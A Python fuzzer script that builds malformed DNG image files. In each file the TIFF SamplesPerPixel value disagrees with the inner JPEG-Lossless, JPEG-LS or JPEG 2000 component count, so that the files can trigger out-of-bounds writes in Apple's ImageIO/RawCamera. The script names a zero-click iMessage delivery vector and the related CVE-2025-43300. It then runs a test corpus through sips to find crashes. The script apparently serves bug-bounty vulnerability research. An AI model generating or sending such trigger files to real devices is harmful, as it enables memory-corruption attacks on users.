#!/usr/bin/env python3
"""
DNG Metadata Mismatch Fuzzer
Target: Apple ImageIO / RawCamera component
Bug class: SamplesPerPixel (TIFF outer layer) vs inner codec component count mismatch
           Same class as CVE-2025-43300 (DNG+JPEG-Lossless, patched Aug 2025)

New targets:
  - DNG + JPEG 2000  (compression=34712) -- Csiz (SIZ marker) vs SPP
  - DNG + JPEG-LS    (compression=34892) -- NEAR-lossless, SOF55 Nf vs SPP
  - DNG + JPEGL      (compression=7)     -- original patched path, reference only

Apple Bug Bounty: https://security.apple.com/bounty/
Attack surface: RawCamera process runs outside BlastDoor sandbox
Trigger vector: Zero-click via iMessage / MMS auto-download

Usage:
  python dng_fuzzer.py --out trigger.dng
  python dng_fuzzer.py --codec jpegls --out trigger.dng
  python dng_fuzzer.py --corpus
  python dng_fuzzer.py --test-corpus      (macOS only -- uses sips)
"""

import struct
import os
import sys
import subprocess
import argparse

# ========================== TIFF/DNG constants ==========================

TIFF_LE_MAGIC = b'II' + struct.pack('<H', 42)

T_SUBFILE_TYPE       = 254
T_IMAGE_WIDTH        = 256
T_IMAGE_LENGTH       = 257
T_BITS_PER_SAMPLE    = 258
T_COMPRESSION        = 259
T_PHOTOMETRIC        = 262
T_STRIP_OFFSETS      = 273
T_SAMPLES_PER_PIXEL  = 277
T_ROWS_PER_STRIP     = 278
T_STRIP_BYTE_COUNTS  = 279
T_X_RESOLUTION       = 282
T_Y_RESOLUTION       = 283
T_PLANAR_CONFIG      = 284
T_RESOLUTION_UNIT    = 296
T_CFA_REPEAT_DIM     = 33421
T_CFA_PATTERN        = 33422
T_DNG_VERSION        = 50706
T_DNG_BACKWARD_VER   = 50707
T_UNIQUE_CAM_MODEL   = 50708
T_DEFAULT_SCALE      = 50718
T_DEFAULT_CROP_ORIGIN = 50719
T_DEFAULT_CROP_SIZE  = 50720
T_COLOR_MATRIX1      = 50721
T_AS_SHOT_NEUTRAL    = 50728
T_BASELINE_EXPOSURE  = 50730
T_CALIBRATION_ILLUM1 = 50778
T_BLACK_LEVEL        = 50714
T_WHITE_LEVEL        = 50717

TY_BYTE     = 1
TY_ASCII    = 2
TY_SHORT    = 3
TY_LONG     = 4
TY_RATIONAL = 5
TY_SRATIONAL = 10

COMP_UNCOMPRESSED  = 1
COMP_JPEG_LOSSLESS = 7
COMP_JPEG2000      = 34712
COMP_JPEG_LS       = 34892

PHOTO_CFA        = 32803   # Camera Filter Array (Bayer raw)
PHOTO_LINEAR_RAW = 34892   # Linear raw (demosaiced), required for multi-SPP DNG

# ========================== Two-pass TIFF builder ==========================

class TiffBuilder:
    """
    Correct two-pass TIFF builder.

    Pass 1 (add_* calls): collect all entries as (tag, typ, count, inline_int OR bytes).
    Pass 2 (build):       sort entries, compute the IFD size, assign real offsets to
                          all blob entries, then assemble header + IFD + extra data.

    This avoids the classic bug of computing offsets before knowing the total
    entry count, which makes every data pointer wrong.
    """

    def __init__(self):
        # Each item: (tag, typ, count, value)
        # value is either an int (fits in 4 bytes, stored inline in IFD)
        #           or  bytes  (stored in the extra-data region after the IFD)
        self._items = []
        self._ifd_base = 8  # IFD always starts at byte 8

    # ---- entry helpers ----

    def _add(self, tag, typ, count, value):
        self._items.append((tag, typ, count, value))

    def add_short(self, tag, value):
        self._add(tag, TY_SHORT, 1, int(value))

    def add_long(self, tag, value):
        self._add(tag, TY_LONG, 1, int(value))

    def add_short_array(self, tag, values):
        if len(values) == 1:
            self._add(tag, TY_SHORT, 1, int(values[0]))
        else:
            self._add(tag, TY_SHORT, len(values),
                      b''.join(struct.pack('<H', v) for v in values))

    def add_byte_array(self, tag, data):
        data = bytes(data)
        if len(data) <= 4:
            # Fits inline: pad to 4 bytes, store as little-endian int
            val = int.from_bytes(data.ljust(4, b'\x00'), 'little')
            self._add(tag, TY_BYTE, len(data), val)
        else:
            self._add(tag, TY_BYTE, len(data), data)

    def add_ascii(self, tag, text):
        data = text.encode('ascii') + b'\x00'
        self._add(tag, TY_ASCII, len(data), data)

    def add_rational(self, tag, num, den):
        self._add(tag, TY_RATIONAL, 1, struct.pack('<II', int(num), int(den)))

    def add_srational(self, tag, num, den):
        self._add(tag, TY_SRATIONAL, 1, struct.pack('<ii', int(num), int(den)))

    def add_rational_array(self, tag, pairs):
        data = b''.join(struct.pack('<II', int(n), int(d)) for n, d in pairs)
        self._add(tag, TY_RATIONAL, len(pairs), data)

    def add_srational_array(self, tag, pairs):
        data = b''.join(struct.pack('<ii', int(n), int(d)) for n, d in pairs)
        self._add(tag, TY_SRATIONAL, len(pairs), data)

    def add_strip(self, strip_tag_offset, strip_tag_count, data):
        """
        Register a strip payload.  Adds both StripOffsets and StripByteCounts
        entries whose offset is determined at build() time.
        """
        data = bytes(data)
        # Use a sentinel class so build() can identify these and assign real offset
        self._add(strip_tag_offset, TY_LONG, 1, _StripRef(data))
        self._add(strip_tag_count,  TY_LONG, 1, len(data))

    # ---- final assembly ----

    def build(self):
        # Sort IFD entries by tag (TIFF spec requirement)
        items = sorted(self._items, key=lambda x: x[0])
        n = len(items)

        # IFD layout: 2-byte count + n*12-byte entries + 4-byte next-IFD-offset
        ifd_size  = 2 + n * 12 + 4
        extra_base = self._ifd_base + ifd_size

        # Walk through items and lay out the extra-data region.
        # Items whose value is bytes (or _StripRef) get placed in extra_data
        # in the order they appear (sorted by tag).
        extra_data = bytearray()
        ifd_rows   = []

        strip_blobs = {}  # tag -> bytes, for strip data placed last

        for tag, typ, count, value in items:
            if isinstance(value, _StripRef):
                # Defer strip data to end of extra region
                strip_blobs[tag] = value.data
                ifd_rows.append((tag, typ, count, None))  # offset TBD
            elif isinstance(value, bytes):
                offset = extra_base + len(extra_data)
                extra_data += value
                ifd_rows.append((tag, typ, count, offset))
            else:
                ifd_rows.append((tag, typ, count, int(value)))

        # Place strip blobs at the very end
        strip_offsets = {}
        for tag, data in strip_blobs.items():
            strip_offsets[tag] = extra_base + len(extra_data)
            extra_data += data

        # Assemble IFD bytes
        ifd_bytes = struct.pack('<H', n)
        for (tag, typ, count, offset) in ifd_rows:
            real_offset = strip_offsets.get(tag, offset)
            ifd_bytes += struct.pack('<HHII', tag, typ, count, real_offset)
        ifd_bytes += struct.pack('<I', 0)  # no next IFD

        header = TIFF_LE_MAGIC + struct.pack('<I', self._ifd_base)
        return header + ifd_bytes + bytes(extra_data)


class _StripRef:
    """Sentinel: marks a value as strip image data (offset assigned in build())."""
    def __init__(self, data):
        self.data = bytes(data)


# ========================== JPEG 2000 codestream ==========================

def build_j2k(width, height, csiz, bits=16):
    """
    Minimal JPEG 2000 codestream.
    csiz: Csiz field in SIZ marker = inner component count.
    When csiz < TIFF SamplesPerPixel, the RawCamera decompression loop
    may iterate (SPP / csiz) times too many, writing past the allocated buffer.
    """
    s = bytearray()

    # SOC
    s += b'\xFF\x4F'

    # SIZ marker
    lsiz = 38 + 3 * max(csiz, 1)
    s += b'\xFF\x51'
    s += struct.pack('>H', lsiz)
    s += struct.pack('>H', 0)           # Rsiz
    s += struct.pack('>I', width)       # Xsiz
    s += struct.pack('>I', height)      # Ysiz
    s += struct.pack('>I', 0)           # XOsiz
    s += struct.pack('>I', 0)           # YOsiz
    s += struct.pack('>I', width)       # XTsiz
    s += struct.pack('>I', height)      # YTsiz
    s += struct.pack('>I', 0)           # XTOsiz
    s += struct.pack('>I', 0)           # YTOsiz
    s += struct.pack('>H', max(csiz,1)) # Csiz <-- INNER METADATA (mismatch target)
    for _ in range(max(csiz, 1)):
        s += struct.pack('>B', (bits - 1) & 0x7F)
        s += b'\x01'                    # XRsiz
        s += b'\x01'                    # YRsiz

    # COD -- Coding Style Default
    s += b'\xFF\x52'
    cod = bytearray()
    cod += struct.pack('>H', 12)        # Lcod
    cod += b'\x00'                      # Scod
    cod += b'\x00'                      # progression LRCP
    cod += struct.pack('>H', 1)         # 1 layer
    cod += b'\x00'                      # MCT off
    cod += b'\x05'                      # 5 decomp levels
    cod += b'\x04'                      # CB width exp
    cod += b'\x04'                      # CB height exp
    cod += b'\x00'                      # CB style
    cod += b'\x00'                      # wavelet 5/3 reversible
    s += bytes(cod)

    # QCD -- Quantization Default
    num_subbands = 1 + 3 * 5            # 16 for 5 levels
    qcd_inner = b'\x00' + b'\x80\x00' * num_subbands
    s += b'\xFF\x5C'
    s += struct.pack('>H', len(qcd_inner) + 2)
    s += qcd_inner

    # SOT -- Start of Tile-Part
    s += b'\xFF\x90'
    s += struct.pack('>H', 10)          # Lsot
    s += struct.pack('>H', 0)           # Isot tile 0
    s += struct.pack('>I', 0)           # Psot 0 = extends to EOC
    s += struct.pack('>B', 0)           # TPsot
    s += struct.pack('>B', 1)           # TNsot

    # SOD -- Start of Data
    s += b'\xFF\x93'

    # Stub bitstream: minimal zero bytes so the decompressor starts iterating.
    # The bug is in loop bounds, not in bitstream content.
    s += b'\x00' * max(width * max(csiz, 1) * 2, 32)

    # EOC
    s += b'\xFF\xD9'

    return bytes(s)


# ========================== JPEG-LS codestream ==========================

def build_jpegls(width, height, nf, bits=8):
    """
    Minimal JPEG-LS codestream (ISO 14495-1).
    nf: number of components in SOF55 marker = inner component count.
    """
    bits = min(bits, 8)   # JPEG-LS most common at 8-bit
    s = bytearray()
    s += b'\xFF\xD8'       # SOI

    # SOF55 (0xFFF7) -- JPEG-LS frame header
    nf = max(nf, 1)
    lsof = 8 + 3 * nf
    s += b'\xFF\xF7'
    s += struct.pack('>H', lsof)
    s += struct.pack('>B', bits)        # P: precision
    s += struct.pack('>H', height)      # Y
    s += struct.pack('>H', width)       # X
    s += struct.pack('>B', nf)          # Nf <-- INNER METADATA (mismatch target)
    for i in range(nf):
        s += struct.pack('>B', i + 1)   # Ci
        s += b'\x11'                    # Hi:Vi 1:1
        s += b'\x00'                    # Tqi

    # SOS -- Start of Scan
    lsos = 6 + 2 * nf
    s += b'\xFF\xDA'
    s += struct.pack('>H', lsos)
    s += struct.pack('>B', nf)
    for i in range(nf):
        s += struct.pack('>B', i + 1)   # Csj
        s += b'\x00'                    # Tmj
    s += b'\x00'                        # NEAR = 0 (lossless)
    s += b'\x00'                        # ILV = 0 (non-interleaved)
    s += b'\x00'                        # Al/Ah

    s += b'\x00' * max(width * nf, 32)
    s += b'\xFF\xD9'                    # EOI
    return bytes(s)


# ========================== JPEG-Lossless (SOF3) builder ==========================

def build_jpegl(width, height, nf, bits=16):
    """
    Valid JPEG-Lossless (SOF3) stream for an all-zero image.
    nf: component count in SOF3 = INNER metadata (mismatch target).
    Outer TIFF SamplesPerPixel != nf is what triggers the OOB bug class.

    Encoding details for an all-zero image:
      - Predictor 1 (Ra): first pixel uses Ra=0 (border); subsequent use left neighbor
      - All pixels = 0, so every prediction error = 0
      - Huffman table: 1 code of length 1 bit ('0') for symbol 0 (category 0 = zero error)
      - Scan data: width*height*nf zero bits, packed into (n_bits+7)//8 zero bytes
      - No 0xFF bytes in scan data so no byte-stuffing needed
    """
    nf = max(nf, 1)
    s = bytearray()
    s += b'\xFF\xD8'  # SOI

    # SOF3 (lossless sequential)
    lsof = 8 + 3 * nf
    s += b'\xFF\xC3'
    s += struct.pack('>H', lsof)
    s += struct.pack('>B', bits)    # P: sample precision
    s += struct.pack('>H', height)  # Y
    s += struct.pack('>H', width)   # X
    s += struct.pack('>B', nf)      # Nf  <-- INNER METADATA (mismatch target)
    for i in range(nf):
        s += struct.pack('>B', i + 1)  # Ci: component identifier
        s += b'\x11'                   # Hi:Vi = 1:1
        s += b'\x00'                   # Tqi

    # DHT: one shared Huffman table (Tc=0 DC, Th=0).
    # BITS[1..16] = [1, 0, 0, ..., 0]  — exactly 1 code of length 1 bit.
    # HUFFVAL     = [0]                 — that code represents category 0 (zero error).
    # Code assignment: category 0 → '0' (single 0 bit).
    dht_payload = b'\x00'            # Tc=0, Th=0
    dht_payload += b'\x01' + b'\x00' * 15  # BITS[1..16]
    dht_payload += b'\x00'           # HUFFVAL[0] = 0
    s += b'\xFF\xC4'
    s += struct.pack('>H', 2 + len(dht_payload))
    s += dht_payload

    # SOS: interleaved scan of all nf components, all using Huffman table 0
    lsos = 6 + 2 * nf
    s += b'\xFF\xDA'
    s += struct.pack('>H', lsos)
    s += struct.pack('>B', nf)
    for i in range(nf):
        s += struct.pack('>B', i + 1)  # Csj: component selector
        s += b'\x00'                   # Tdj: Huffman table 0
    s += b'\x01'   # Ss = 1 (predictor Ra)
    s += b'\x00'   # Se = 0
    s += b'\x00'   # Ah=0, Al=0

    # Scan data: each of width*height*nf pixels encodes as 1 zero bit.
    # Total: (w*h*nf+7)//8 zero bytes — no 0xFF bytes, no stuffing needed.
    n_bits = width * height * nf
    s += bytes((n_bits + 7) // 8)

    s += b'\xFF\xD9'  # EOI
    return bytes(s)


# ========================== DNG assembler ==========================

def build_dng(width=64, height=64, spp=3, inner_comps=1,
              bits=16, codec=COMP_JPEG2000, outfile=None):
    """
    Assemble a DNG file with deliberate mismatch between:
      TIFF SamplesPerPixel (spp)       -- outer metadata, controls buffer allocation
      inner codec component count      -- inner metadata, controls loop iteration

    The gap between spp and inner_comps is what triggers the OOB write.

    Uses PhotometricInterpretation=34892 (LinearRaw) + mandatory DNG Camera Raw
    tags so ImageIO routes to the RawCamera plugin (same path as CVE-2025-43300).
    """
    b = TiffBuilder()

    # --- Core TIFF tags ---
    b.add_long(T_SUBFILE_TYPE, 0)           # 0 = full-resolution image (required by DNG)
    b.add_long(T_IMAGE_WIDTH,  width)
    b.add_long(T_IMAGE_LENGTH, height)
    b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
    b.add_short(T_COMPRESSION, codec)
    # LinearRaw (34892) is the correct PhotometricInterpretation for processed DNG
    # with multiple components — this routes to the Camera Raw plugin, same path
    # as CVE-2025-43300.  RGB (2) routes to the generic TIFF plugin which lacks
    # the DNG codec handlers.
    b.add_short(T_PHOTOMETRIC, PHOTO_LINEAR_RAW)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)   # OUTER METADATA <-- controls alloc
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)

    # --- DNG identification tags (mandatory for Camera Raw routing) ---
    b.add_byte_array(T_DNG_VERSION,      bytes([1, 4, 0, 0]))
    b.add_byte_array(T_DNG_BACKWARD_VER, bytes([1, 1, 0, 0]))
    b.add_ascii(T_UNIQUE_CAM_MODEL, 'FuzzResearch/ImageIOAudit')

    # --- DNG Camera Raw mandatory tags ---
    # DefaultScale: 1:1 pixel scale
    b.add_rational_array(T_DEFAULT_SCALE, [(1, 1), (1, 1)])
    # DefaultCropOrigin and DefaultCropSize
    b.add_rational_array(T_DEFAULT_CROP_ORIGIN, [(0, 1), (0, 1)])
    b.add_rational_array(T_DEFAULT_CROP_SIZE,   [(width, 1), (height, 1)])
    # ColorMatrix1 (for D65 illuminant) - identity-ish 3x3 as 9 SRATIONALs
    identity_cm = [(10000, 10000), (0, 1), (0, 1),
                   (0, 1), (10000, 10000), (0, 1),
                   (0, 1), (0, 1), (10000, 10000)]
    b.add_srational_array(T_COLOR_MATRIX1, identity_cm)
    b.add_short(T_CALIBRATION_ILLUM1, 21)   # D65
    # AsShotNeutral: neutral color balance (all 1.0)
    b.add_rational_array(T_AS_SHOT_NEUTRAL, [(1, 1)] * spp)
    # BaselineExposure: 0 EV
    b.add_srational(T_BASELINE_EXPOSURE, 0, 1)
    # BlackLevel = 0, WhiteLevel = 2^bits - 1
    b.add_short(T_BLACK_LEVEL, 0)
    b.add_long(T_WHITE_LEVEL, (1 << bits) - 1)

    if codec == COMP_UNCOMPRESSED:
        # Raw pixel data: width*height*spp samples of zeros
        payload = bytes(width * height * spp * (bits // 8))
        label = 'Uncompressed'
    elif codec == COMP_JPEG2000:
        payload = build_j2k(width, height, csiz=inner_comps, bits=bits)
        label = f'J2K csiz={inner_comps}'
    elif codec == COMP_JPEG_LS:
        payload = build_jpegls(width, height, nf=inner_comps, bits=min(bits, 8))
        label = f'JPEG-LS nf={inner_comps}'
    elif codec == COMP_JPEG_LOSSLESS:
        payload = build_jpegl(width, height, nf=inner_comps, bits=bits)
        label = f'JPEG-L nf={inner_comps}'
    else:
        raise ValueError(f'Unknown codec: {codec}')

    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, payload)

    data = b.build()

    if outfile:
        with open(outfile, 'wb') as f:
            f.write(data)

        alloc = width * height * spp * (bits // 8)
        if 0 < inner_comps < spp:
            write  = alloc * (spp // inner_comps)
            overflow = write - alloc
        else:
            write = alloc
            overflow = 0

        print(f'\n[+] {outfile}')
        print(f'    Codec:         {label}')
        print(f'    Dimensions:    {width} x {height}   BitsPerSample: {bits}')
        print(f'    TIFF SPP:      {spp}   (outer -- controls malloc size)')
        print(f'    Inner comps:   {inner_comps}   (inner -- controls loop count)')
        print(f'    File size:     {len(data):,} bytes')
        print(f'    Alloc (est):   {alloc:,} bytes')
        print(f'    Write (est):   {write:,} bytes')
        print(f'    OOB est:       {overflow:,} bytes')

    return data


# ========================== Corpus ==========================

CORPUS = [
    # (width, height, spp, inner_comps, bits, codec, name)
    #
    # ---- STRUCTURE CHECK: uncompressed DNG (should always decode) ----
    # If this fails rc=13, DNG structure itself is wrong.
    # If this succeeds rc=0, DNG structure is fine, issue is codec routing.
    (8,   8,  1, 1, 16, COMP_UNCOMPRESSED, 'DIAG_uncompressed_1spp_16b'),
    (8,   8,  3, 3, 16, COMP_UNCOMPRESSED, 'DIAG_uncompressed_3spp_16b'),
    #
    # ---- JPEG-Lossless (SOF3, compression=7) ----
    # Same code path as CVE-2025-43300. Valid bitstream, mismatch in Nf vs SPP.
    # CTRL: spp == nf (matched) — should decode clean (rc=0). Baseline check.
    (64,  64,  1, 1, 16, COMP_JPEG_LOSSLESS, 'CTRL_jpegl_1spp_1nf_16b'),
    (64,  64,  3, 3, 16, COMP_JPEG_LOSSLESS, 'CTRL_jpegl_3spp_3nf_16b'),
    # Mismatch targets: nf < spp → allocate for nf, loop over spp → OOB write
    (64,  64,  2, 1, 16, COMP_JPEG_LOSSLESS, 'jpegl_2spp_1nf_16b'),
    (64,  64,  3, 1, 16, COMP_JPEG_LOSSLESS, 'jpegl_3spp_1nf_16b'),
    (64,  64,  4, 1, 16, COMP_JPEG_LOSSLESS, 'jpegl_4spp_1nf_16b'),
    (256, 256, 3, 1, 16, COMP_JPEG_LOSSLESS, 'jpegl_3spp_1nf_16b_256'),
    (512, 512, 3, 1, 16, COMP_JPEG_LOSSLESS, 'jpegl_3spp_1nf_16b_512'),
    (64,  64,  4, 2, 16, COMP_JPEG_LOSSLESS, 'jpegl_4spp_2nf_16b'),
    (64,  64,  6, 1, 16, COMP_JPEG_LOSSLESS, 'jpegl_6spp_1nf_16b'),
    #
    # ---- JPEG-LS (compression=34892) ----
    # CTRL: matched
    (64,  64,  1, 1,  8, COMP_JPEG_LS, 'CTRL_jpegls_1spp_1nf_8b'),
    (64,  64,  3, 3,  8, COMP_JPEG_LS, 'CTRL_jpegls_3spp_3nf_8b'),
    # Mismatch targets
    (64,  64,  3, 1,  8, COMP_JPEG_LS, 'jpegls_3spp_1nf_8b'),
    (64,  64,  4, 1,  8, COMP_JPEG_LS, 'jpegls_4spp_1nf_8b'),
    (256, 256, 3, 1,  8, COMP_JPEG_LS, 'jpegls_3spp_1nf_8b_256'),
    #
    # ---- J2K (compression=34712) — retained, likely unsupported by sips ----
    (64,  64,  1, 1, 16, COMP_JPEG2000, 'CTRL_j2k_1spp_1csiz_16b'),
    (64,  64,  3, 1, 16, COMP_JPEG2000, 'j2k_3spp_1csiz_16b'),
    (64,  64,  4, 1, 16, COMP_JPEG2000, 'j2k_4spp_1csiz_16b'),
]


def generate_corpus(outdir='corpus'):
    os.makedirs(outdir, exist_ok=True)
    print(f'[*] Generating {len(CORPUS)} test cases -> {outdir}/')
    for (w, h, spp, ic, bits, codec, name) in CORPUS:
        fname = os.path.join(outdir, f'{name}.dng')
        try:
            build_dng(w, h, spp=spp, inner_comps=ic, bits=bits,
                      codec=codec, outfile=fname)
        except Exception as e:
            print(f'    [!] {name}: {e}')
    print(f'\n[+] Corpus ready.')


# ========================== macOS tester ==========================

def test_corpus(outdir='corpus'):
    """Run all corpus files through macOS sips (ImageIO). macOS only."""
    if sys.platform != 'darwin':
        print('[!] --test-corpus requires macOS. On your Mac, run:')
        print(f'    python dng_fuzzer.py --test-corpus')
        print()
        print('    Or manually:')
        print(f'    for f in {outdir}/*.dng; do')
        print(f'      echo "=== $f ==="; sips -g all "$f" 2>&1 | head -4; done')
        return

    files = sorted(f for f in os.listdir(outdir) if f.endswith('.dng'))
    print(f'[*] Testing {len(files)} files via sips...\n')
    crashes, hangs, ok = [], [], []

    for fname in files:
        path = os.path.join(outdir, fname)
        try:
            r = subprocess.run(['sips', '-g', 'all', path],
                               capture_output=True, text=True, timeout=10)
            if r.returncode != 0:
                crashes.append((fname, r.returncode, r.stderr.strip()))
                print(f'  [CRASH rc={r.returncode}] {fname}')
                if r.stderr:
                    print(f'    {r.stderr.strip()[:120]}')
            else:
                ok.append(fname)
                # Show compression/size reported by sips
                for line in r.stdout.splitlines():
                    if any(k in line for k in ('format','pixelWidth','pixelHeight')):
                        print(f'  [  ok ] {fname}  {line.strip()}')
                        break
                else:
                    print(f'  [  ok ] {fname}')
        except subprocess.TimeoutExpired:
            hangs.append(fname)
            print(f'  [ HANG] {fname}  (timeout -- infinite loop?)')

    print(f'\n--- Results: ok={len(ok)}  crash={len(crashes)}  hang={len(hangs)} ---')
    if crashes:
        print('\n[!] Potential findings (crashes):')
        for f, rc, err in crashes:
            print(f'    {f}  rc={rc}')
    if hangs:
        print('\n[!] Hangs -- investigate for infinite loops:')
        for f in hangs:
            print(f'    {f}')


# ========================== Entry point ==========================

def main():
    ap = argparse.ArgumentParser(
        description='DNG+J2K/JPEGLS metadata mismatch fuzzer for Apple ImageIO'
    )
    ap.add_argument('--out',    default='trigger.dng')
    ap.add_argument('--codec',  default='j2k',
                    choices=['j2k', 'jpegls', 'jpegl'])
    ap.add_argument('--width',  type=int, default=64)
    ap.add_argument('--height', type=int, default=64)
    ap.add_argument('--spp',    type=int, default=3,
                    help='TIFF SamplesPerPixel (outer metadata)')
    ap.add_argument('--inner',  type=int, default=1,
                    help='Inner codec component count (inner metadata)')
    ap.add_argument('--bits',   type=int, default=16)
    ap.add_argument('--corpus', action='store_true',
                    help='Generate full test corpus')
    ap.add_argument('--test-corpus', action='store_true',
                    help='Test corpus via sips (macOS only)')
    args = ap.parse_args()

    codec_map = {'j2k': COMP_JPEG2000, 'jpegls': COMP_JPEG_LS, 'jpegl': COMP_JPEG_LOSSLESS}

    if args.corpus:
        generate_corpus()
        return
    if args.test_corpus:
        test_corpus()
        return

    build_dng(args.width, args.height,
              spp=args.spp, inner_comps=args.inner,
              bits=args.bits, codec=codec_map[args.codec],
              outfile=args.out)


if __name__ == '__main__':
    main()
